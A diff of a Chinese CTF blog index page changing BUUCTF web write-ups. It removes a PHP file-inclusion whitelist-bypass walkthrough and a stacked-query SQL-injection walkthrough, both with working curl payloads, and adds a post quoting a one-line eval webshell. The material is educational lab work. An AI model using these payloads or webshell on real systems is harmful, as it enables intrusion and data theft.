+<td>添加自定义请求头</td>
+</tr>
+<tr>
+<td><code>-v</code></td>
+<td>显示详细通信过程</td>
+</tr>
+<tr>
+<td><code>-X METHOD</code></td>
+<td>指定请求方法（GET&#x2F;POST等）</td>
+</tr>
+<tr>
+<td><code>-d DATA</code></td>
+<td>发送 POST 数据</td>
+</tr>
+</tbody></table>
 
       
     </div>
@@ -323,7 +585,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2026/05/02/BUUCTF/WEB/6-upload/" class="post-title-link" itemprop="url">BUUCTF - 文件上传绕过实战 (上传头像)</a>
+            <a href="/2026/05/02/BUUCTF/WEB/6-upload/" class="post-title-link" itemprop="url">6-BUUCTF - 文件上传绕过实战 (上传头像)</a>
         </h2>
 
         <div class="post-meta">
@@ -340,7 +602,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-05-03 12:50:42" itemprop="dateModified" datetime="2026-05-03T12:50:42+08:00">2026-05-03</time>
+                <time title="修改时间：2026-05-03 16:28:00" itemprop="dateModified" datetime="2026-05-03T16:28:00+08:00">2026-05-03</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -437,7 +699,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2026/05/02/BUUCTF/WEB/6-upload-deepseek/" class="post-title-link" itemprop="url">BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp</a>
+            <a href="/2026/05/02/BUUCTF/WEB/6-upload-deepseek/" class="post-title-link" itemprop="url">6-BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp</a>
         </h2>
 
         <div class="post-meta">
@@ -454,7 +716,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-05-03 12:50:45" itemprop="dateModified" datetime="2026-05-03T12:50:45+08:00">2026-05-03</time>
+                <time title="修改时间：2026-05-03 16:28:05" itemprop="dateModified" datetime="2026-05-03T16:28:05+08:00">2026-05-03</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -682,7 +944,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/2-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-WarmUp/">
+    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/7-knife/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/saber.jpg">
@@ -696,7 +958,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2026/05/02/BUUCTF/WEB/2-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-WarmUp/" class="post-title-link" itemprop="url">CTF - PHP代码审计 WarmUp 题解</a>
+            <a href="/2026/05/02/BUUCTF/WEB/7-knife/" class="post-title-link" itemprop="url">7- Knife (菜刀)</a>
         </h2>
 
         <div class="post-meta">
@@ -713,7 +975,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-05-03 12:47:13" itemprop="dateModified" datetime="2026-05-03T12:47:13+08:00">2026-05-03</time>
+                <time title="修改时间：2026-05-03 12:50:48" itemprop="dateModified" datetime="2026-05-03T12:50:48+08:00">2026-05-03</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -740,270 +1002,127 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="CTF-PHP代码审计-WarmUp-题解"><a href="#CTF-PHP代码审计-WarmUp-题解" class="headerlink" title="CTF - PHP代码审计 WarmUp 题解"></a>CTF - PHP代码审计 WarmUp 题解</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
-<li><strong>题目类型</strong>: PHP代码审计、文件包含漏洞</li>
-<li><strong>题目URL</strong>: <a target="_blank" rel="noopener" href="http://c7273dac-491b-4046-88a6-fafcec0b76fa.node5.buuoj.cn:81/source.php">http://c7273dac-491b-4046-88a6-fafcec0b76fa.node5.buuoj.cn:81/source.php</a></li>
-</ul>
-<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="1-查看源代码"><a href="#1-查看源代码" class="headerlink" title="1. 查看源代码"></a>1. 查看源代码</h3><p>访问 <code>source.php</code>，可以看到PHP源代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-获取Hint提示"><a href="#2-获取Hint提示" class="headerlink" title="2. 获取Hint提示"></a>2. 获取Hint提示</h3><p>访问 <code>hint.php</code> 获取提示：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://c7273dac-491b-4046-88a6-fafcec0b76fa.node5.buuoj.cn:81/hint.php&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>返回结果</strong>: <code>flag not here, and flag in ffffllllaaaagggg</code></p>
-<p>得知flag位于 <code>ffffllllaaaagggg</code> 文件中。</p>
-<h3 id="3-代码分析"><a href="#3-代码分析" class="headerlink" title="3. 代码分析"></a>3. 代码分析</h3><p><strong>漏洞类型</strong>: 本地文件包含(LFI) + 白名单绕过</p>
-<p><strong>关键代码分析</strong>:</p>
-<ol>
-<li><strong>白名单检查</strong>: 只允许 <code>source.php</code> 和 <code>hint.php</code></li>
-<li><strong>三次检查机制</strong>:<ul>
-<li>第一次: 直接检查 <code>$page</code> 是否在白名单中</li>
-<li>第二次: 截取 <code>$page</code> 中 <code>?</code> 之前的部分检查</li>
-<li>第三次: 对 <code>$page</code> 进行 <code>urldecode</code> 后，再截取 <code>?</code> 之前的部分检查</li>
-</ul>
-</li>
-<li><strong>文件包含</strong>: 如果通过检查，会执行 <code>include $_REQUEST[&#39;file&#39;]</code></li>
-</ol>
-<p><strong>漏洞点</strong>: </p>
-<ul>
-<li>虽然检查了 <code>?</code> 之前的部分是否在白名单中</li>
-<li>但实际包含的是完整的 <code>$_REQUEST[&#39;file&#39;]</code></li>
-<li>可以利用 <code>source.php?/../../../../ffffllllaaaagggg</code> 来绕过</li>
-</ul>
-<h3 id="4-构造Payload"><a href="#4-构造Payload" class="headerlink" title="4. 构造Payload"></a>4. 构造Payload</h3><p>需要利用双编码绕过：</p>
-<ul>
-<li><code>?</code> 的URL编码是 <code>%3f</code></li>
-<li>但浏览器会自动解码一次，所以需要双重编码：<code>%253f</code></li>
-</ul>
-<p><strong>Payload构造</strong>:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php%3f/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-获取Flag"><a href="#5-获取Flag" class="headerlink" title="5. 获取Flag"></a>5. 获取Flag</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://c7273dac-491b-4046-88a6-fafcec0b76fa.node5.buuoj.cn:81/source.php?file=source.php%3f/../../../../ffffllllaaaagggg&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>返回结果</strong>:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fa32add5-b1d6-4818-b1b4-de37734b9d99&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="1-PHP文件包含漏洞"><a href="#1-PHP文件包含漏洞" class="headerlink" title="1. PHP文件包含漏洞"></a>1. PHP文件包含漏洞</h3><ul>
-<li><code>include</code> 和 <code>require</code> 函数可以包含本地或远程文件</li>
-<li>当用户可控参数被直接用于文件包含时，存在安全风险</li>
-</ul>
-<h3 id="2-白名单绕过技巧"><a href="#2-白名单绕过技巧" class="headerlink" title="2. 白名单绕过技巧"></a>2. 白名单绕过技巧</h3><ul>
-<li><strong>截断绕过</strong>: 利用 <code>?</code> <code>#</code> 等特殊字符截断文件名</li>
-<li><strong>路径遍历</strong>: 使用 <code>../</code> 或 <code>..\</code> 访问上级目录</li>
-<li><strong>编码绕过</strong>: 利用URL编码、双重URL编码等</li>
-</ul>
-<h3 id="3-mb-substr-和-mb-strpos-函数"><a href="#3-mb-substr-和-mb-strpos-函数" class="headerlink" title="3. mb_substr 和 mb_strpos 函数"></a>3. mb_substr 和 mb_strpos 函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>(<span class="variable">$str</span>, <span class="variable">$start</span>, <span class="variable">$length</span>)  <span class="comment">// 截取多字节字符串</span></span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$haystack</span>, <span class="variable">$needle</span>)     <span class="comment">// 查找多字节字符串位置</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="4-URL编码原理"><a href="#4-URL编码原理" class="headerlink" title="4. URL编码原理"></a>4. URL编码原理</h3><ul>
-<li><code>%3f</code> &#x3D; <code>?</code></li>
-<li><code>%25</code> &#x3D; <code>%</code></li>
-<li>双重编码: <code>%253f</code> → 第一次解码为 <code>%3f</code> → 第二次解码为 <code>?</code></li>
-</ul>
-<h3 id="5-目录遍历"><a href="#5-目录遍历" class="headerlink" title="5. 目录遍历"></a>5. 目录遍历</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./          当前目录</span><br><span class="line">../         上级目录</span><br><span class="line">../../      上两级目录</span><br><span class="line">../../../../ffffllllaaaagggg   向上回溯4级后访问目标文件</span><br></pre></td></tr></table></figure>
-
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
-<li><strong>严格白名单</strong>: 只允许特定文件，不使用部分匹配</li>
-<li><strong>路径规范化</strong>: 使用 <code>realpath()</code> 函数获取真实路径</li>
-<li><strong>禁止用户输入</strong>: 避免用户可控参数直接用于文件包含</li>
-<li><strong>open_basedir</strong>: 设置PHP只能访问指定目录</li>
-</ol>
+          <h1 id="7-Knife-菜刀"><a href="#7-Knife-菜刀" class="headerlink" title="7- Knife (菜刀)"></a>7- Knife (菜刀)</h1><p><strong>题目名称:</strong> 白给的shell</p>
+<p><strong>题目描述:</strong> 我家菜刀丢了，你能帮我找一下么</p>
+<p><strong>题目地址:</strong> <a target="_blank" rel="noopener" href="http://c10e41e9-cfcb-4d2e-a6b5-5ea9d134fd28.node5.buuoj.cn:81/">http://c10e41e9-cfcb-4d2e-a6b5-5ea9d134fd28.node5.buuoj.cn:81/</a></p>
 <hr>
-<p><strong>Flag</strong>: <code>flag{fa32add5-b1d6-4818-b1b4-de37734b9d99}</code></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/saber.jpg">
-      <meta itemprop="name" content="zhaochoudecat">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zhaochoudecat">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="post-title-link" itemprop="url">CTF SQL注入 - 随便注</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2026-05-02 00:00:00" itemprop="dateCreated datePublished" datetime="2026-05-02T00:00:00+08:00">2026-05-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-05-03 12:50:37" itemprop="dateModified" datetime="2026-05-03T12:50:37+08:00">2026-05-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/BUUCTF/" itemprop="url" rel="index"><span itemprop="name">BUUCTF</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/BUUCTF/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="CTF-SQL注入-随便注"><a href="#CTF-SQL注入-随便注" class="headerlink" title="CTF SQL注入 - 随便注"></a>CTF SQL注入 - 随便注</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
-<li><strong>题目名称</strong>: easy_sql &#x2F; 随便注</li>
-<li><strong>题目类型</strong>: SQL注入</li>
-<li><strong>题目URL</strong>: <a target="_blank" rel="noopener" href="http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/">http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/</a></li>
-<li><strong>FLAG</strong>: <code>flag{7acd36c9-1cbb-4e30-8ee5-339726d381d2}</code></li>
-</ul>
-<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>页面提示：”取材于某次真实环境渗透，只说一句话：开发和安全缺一不可”<br>页面注释：”sqlmap是没有灵魂的”</p>
-<hr>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="1-初步探测"><a href="#1-初步探测" class="headerlink" title="1. 初步探测"></a>1. 初步探测</h3><p>首先访问题目页面，发现是一个输入框，提示”姿势”，查看源码发现是GET请求，参数名为<code>inject</code>。</p>
-<p><strong>测试正常输入：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>返回结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-确认SQL注入"><a href="#2-确认SQL注入" class="headerlink" title="2. 确认SQL注入"></a>2. 确认SQL注入</h3><p><strong>测试单引号闭合：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>返回错误：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
-
-<p><strong>结论</strong>：存在SQL注入，数据库是MariaDB。</p>
-<h3 id="3-检测过滤关键字"><a href="#3-检测过滤关键字" class="headerlink" title="3. 检测过滤关键字"></a>3. 检测过滤关键字</h3><p>尝试使用<code>union select</code>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;union select 1,2-- &quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>返回：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
-
-<p><strong>结论</strong>：<code>select|update|delete|drop|insert|where|.</code>等关键字被过滤。</p>
-<h3 id="4-堆叠查询探测"><a href="#4-堆叠查询探测" class="headerlink" title="4. 堆叠查询探测"></a>4. 堆叠查询探测</h3><p>由于关键字被过滤，尝试堆叠查询（多语句注入）：</p>
-<p><strong>查看所有数据库：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;show databases;-- &quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>返回结果包含以下数据库：</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>访问目标网站，得到如下页面：</p>
 <ul>
-<li>ctftraining</li>
-<li>information_schema</li>
-<li>mysql</li>
-<li>performance_schema</li>
-<li>supersqli  ← 可疑数据库</li>
-<li>test</li>
+<li><strong>标题:</strong> 白给的shell</li>
+<li><strong>内容:</strong> “我家菜刀丢了，你能帮我找一下么”</li>
+<li><strong>关键源码:</strong> <code>eval($_POST[&quot;Syc&quot;]);</code></li>
 </ul>
-<h3 id="5-查看表结构"><a href="#5-查看表结构" class="headerlink" title="5. 查看表结构"></a>5. 查看表结构</h3><p><strong>查看ctftraining数据库的表：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use ctftraining;show tables;-- &quot;</span></span><br></pre></td></tr></table></figure>
-<p>发现FLAG_TABLE，但字段默认值为”not_flag”，排除。</p>
-<p><strong>查看supersqli数据库的表：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;show tables;-- &quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="关键发现"><a href="#关键发现" class="headerlink" title="关键发现"></a>关键发现</h3><p>页面源码中直接给出了一个 <strong>一句话木马（webshell）</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;Syc&quot;</span>]);</span><br></pre></td></tr></table></figure>
 
-<p>发现两个表：</p>
 <ul>
-<li><code>1919810931114514</code>  ← 数字命名的表，非常可疑</li>
-<li><code>words</code></li>
+<li><code>eval()</code> 是 PHP 中的危险函数，可以将传入的字符串当作 PHP 代码执行</li>
+<li><code>$_POST[&quot;Syc&quot;]</code> 接收通过 POST 方法提交的 <code>Syc</code> 参数值</li>
+<li>这意味着我们可以通过 POST 请求参数 <code>Syc</code> 来执行任意 PHP 代码</li>
 </ul>
-<h3 id="6-查看可疑表的结构"><a href="#6-查看可疑表的结构" class="headerlink" title="6. 查看可疑表的结构"></a>6. 查看可疑表的结构</h3><p><strong>查看words表结构：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;show columns from words;-- &quot;</span></span><br></pre></td></tr></table></figure>
-<p>结果：id(int), data(varchar)</p>
-<p><strong>查看数字表结构（注意反引号）：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;show columns from \`1919810931114514\`;-- &quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>关键发现</strong>：该表有一个字段叫<code>flag</code>！</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="7-绕过select过滤获取flag"><a href="#7-绕过select过滤获取flag" class="headerlink" title="7. 绕过select过滤获取flag"></a>7. 绕过select过滤获取flag</h3><p>由于<code>select</code>被过滤，尝试以下方法：</p>
-<h4 id="尝试1：预处理语句（失败）"><a href="#尝试1：预处理语句（失败）" class="headerlink" title="尝试1：预处理语句（失败）"></a>尝试1：预处理语句（失败）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;set @sql=CONCAT(&#x27;se&#x27;,&#x27;lect * from \`1919810931114514\`;&#x27;);prepare stmt from @sql;execute stmt;-- &quot;</span></span><br></pre></td></tr></table></figure>
-<p>返回过滤提示：<code>strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</code></p>
-<h4 id="尝试2：重命名表（备选方案）"><a href="#尝试2：重命名表（备选方案）" class="headerlink" title="尝试2：重命名表（备选方案）"></a>尝试2：重命名表（备选方案）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;rename table words to words1;rename table \`1919810931114514\` to words;-- &quot;</span></span><br></pre></td></tr></table></figure>
-<p>可以执行成功，但没有直接返回数据。</p>
-<h4 id="尝试3：handler语句（成功！）"><a href="#尝试3：handler语句（成功！）" class="headerlink" title="尝试3：handler语句（成功！）"></a>尝试3：handler语句（成功！）</h4><p>MySQL&#x2F;MariaDB的<code>handler</code>语句可以直接读取表数据，无需使用select。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;handler \`1919810931114514\` open;handler \`1919810931114514\` read first;-- &quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>成功获取flag：</strong></p>
